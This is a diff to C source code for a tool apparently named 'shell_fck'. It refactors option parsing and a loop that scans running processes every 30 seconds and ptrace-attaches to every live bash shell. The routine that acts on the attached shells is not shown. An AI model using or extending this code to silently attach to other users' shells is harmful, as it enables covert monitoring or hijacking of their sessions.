@@ -1,20 +1,5 @@
 #include "shell_fck.h"
 
-/* Mainly used for debugging */
-void do_child(pid_t pid, char **argv)
-{
-	puts("[*] Setting up child [*]\n");
-
-	/* Tell parent we are ready to be traced */
-	ptrace(PTRACE_TRACEME, pid, 0,0);
-	kill(getpid(), SIGSTOP);
-
-	/* do execve and stuff */
-	char *bin = "/bin/bash";
-	execv(bin, argv);
-
-}
-
 /* usage function */
 void usage()
 {
@@ -36,56 +21,43 @@ int main(int argc, char **argv)
 		{"help", no_argument, 0, 'h'}
 	};
 
-	/* if user didn't give args, we just run the shell ourselves */
-	if(argc == 1)
+	int option;
+	int long_index = 0;
+	char *value;
+	while((option = getopt_long(argc, argv, "p:n:lh", long_options, &long_index)) != -1)
 	{
-		pid = fork();
-
-		if(pid == 0)
+		switch(option)
 		{
-			do_child(pid, argv);
+			case 'p':
+				pid = atoi(optarg);
+				pthread_t thread_id;
+				struct pid_struct *proc = (struct pid_struct *) malloc(sizeof(pid_struct));
+
+				proc->pid = pid;
+				memset(proc->proc_name, 0, sizeof(proc->proc_name));
+				proc->is_child = false;
+				proc->next = NULL;
+
+				/* Create a new thread to handle messing with the process */
+				if(pthread_create(&thread_id, NULL, init_thread, proc)) 
+					printf("[!] Error creating thread [!]\n");
+
+				pthread_join(thread_id, NULL); //wait for the thread to finish
+				break;
+			case 'n':
+				process_name = optarg;
+				struct pid_struct *current_pids = find_process(process_name, 0);
+				free(current_pids);
+				break;
+			case 'l':
+				find_process("ALL", 0);
+				break;
+			case 'h':
+				usage();
+				break;
 		}
 	}
-	/* Otherwise, parse the users options and go from there */
-	else
-	{
-		int option;
-		int long_index = 0;
-		char *value;
-		while((option = getopt_long(argc, argv, "p:n:lh", long_options, &long_index)) != -1)
-		{
-			switch(option)
-			{
-				case 'p':
-					pid = atoi(optarg);
-					pthread_t thread_id;
-					struct pid_struct *proc = (struct pid_struct *) malloc(sizeof(pid_struct));
 
-					proc->pid = pid;
-					memset(proc->proc_name, 0, sizeof(proc->proc_name));
-					proc->is_child = false;
-					proc->next = NULL;
-
-					/* Create a new thread to handle messing with the process */
-					if(pthread_create(&thread_id, NULL, init_thread, proc)) 
-						printf("[!] Error creating thread [!]\n");
-
-					pthread_join(thread_id, NULL); //wait for the thread to finish
-					break;
-				case 'n':
-					process_name = optarg;
-					struct pid_struct *current_pids = find_process(process_name, 0);
-					free(current_pids);
-					break;
-				case 'l':
-					find_process("ALL", 0);
-					break;
-				case 'h':
-					usage();
-					break;
-			}
-		}
-	}
 
 	/* using if(false) for testing purposes */
 	if(true)
@@ -100,14 +72,14 @@ int main(int argc, char **argv)
 		pthread_t thread_id;
 
 		/* Null out the buckets */
-		for(int i = 0; i < 500; i++)
+		for(int i = 0; i < my_table->size; i++)
 			my_table->table[i] = NULL;
 		
 		unsigned int timer = 0;
 
 		while(true)
 		{
-			if(timer == 10) //clear the hash table every 5 minutes
+			if(timer == 0) //clear the hash table every 5 minutes
 			{
 				printf("CLEARING\n");
 				clear_table(my_table);
@@ -121,27 +93,28 @@ int main(int argc, char **argv)
 				update_hash_table(proc_list, my_table);
 			
 			/* Iterate over the hashtable and decide which processes to attach to */
-			for(int i = 0; i < 500; i++)
+			for(int i = 0; i < my_table->size; i++)
 			{
 				struct pid_struct *proc = my_table->table[i];
 
-				if(proc != NULL)
+				/* Iterate over the entries in that position of the hashtable */
+				while(proc != NULL)
 				{
-					while(proc != NULL)
+					/* We can use the proc_name field to decide what processes to attach to */
+					if(strcmp(proc->proc_name, "bash") == 0 && proc->is_alive && !proc->being_traced)
 					{
-						if(strcmp(proc->proc_name, "bash") == 0 && proc->is_alive && !proc->being_traced)
-						{
-							pthread_create(&thread_id, NULL, init_thread, proc);
+						/* If the thread is successfully created */
+						if(pthread_create(&thread_id, NULL, init_thread, proc) == 0)
 							proc->being_traced = true; //mark this process as being traced
-						}
-						
-						proc = proc->next;
 					}
+						
+					proc = proc->next;
 				}
+				
 			}
 
 			//Debug (Print the state of the hash table)
-			for(int i = 0; i < 500; i++)
+			for(int i = 0; i < my_table->size; i++)
 			{
 				if(my_table->table[i] != NULL)
 				{
@@ -162,58 +135,25 @@ int main(int argc, char **argv)
 			/* Sleep to save system resources */
 			sleep(30);
 			timer++;
-			//break;
 		}
 	}
 
 }
 
-
-void update_hash_table(struct pid_struct *current_pids, struct pid_hash_table *current_table)
-{
-	/* iterate over the current process list if it is not null */
-	while(current_pids->next != NULL)
-	{
-		/* We set the bucket position to the pid modulo bucket size */
-		int bucket_position = (current_pids->pid % current_table->size);
-
-		/* We need to create a tmp pid struct to check if that position has a pid in it */
-		struct pid_struct *tmp = current_table->table[bucket_position];
-		
-		if(tmp == NULL) //this means that the position is free
-		{
-			//add the pid to the table
-			struct pid_struct *new_pid = create_pid_struct(current_pids->pid, current_pids->proc_name, current_pids->is_child, NULL);
-			current_table->table[bucket_position] = new_pid;
-		}
-		else
-		{
-            /* Find the end of the linked list */
-			while(tmp->next != NULL)
-			{
-				//p = tmp; //track the last proc struct
-				tmp = tmp->next; //increment tmp
-			}
-			/* Add the new process to the chain in the hash table */
-			struct pid_struct *new_pid = create_pid_struct(current_pids->pid, current_pids->proc_name, current_pids->is_child, NULL);
-			tmp->next = new_pid; //at this point p->next is NULL, set it to the new pid
-			new_pid->next = NULL;
-			
-		}
-		/* Carry on iterating through the process list */
-		current_pids = current_pids->next;
-
-	}
 	
-}
-	
-
 void *init_thread(void *args)
 {
 	struct pid_struct *proc = (struct pid_struct *)args;
 
 	printf("[+] Attempting to attach to pid: %d [+]\n", proc->pid);
-	ptrace(PTRACE_ATTACH, proc->pid, NULL, NULL);
+	
+	/* Ensure we actually attach to the process */
+	if(ptrace(PTRACE_ATTACH, proc->pid, NULL, NULL) != 0)
+	{
+		printf("[!] Error attaching to process %d [!]\n", proc->pid);
+		proc->being_traced = false;
+		return NULL;
+	}
 
 	printf("[+] Calling trace child on pid: %d\n", proc->pid);
 	trace_child(proc);
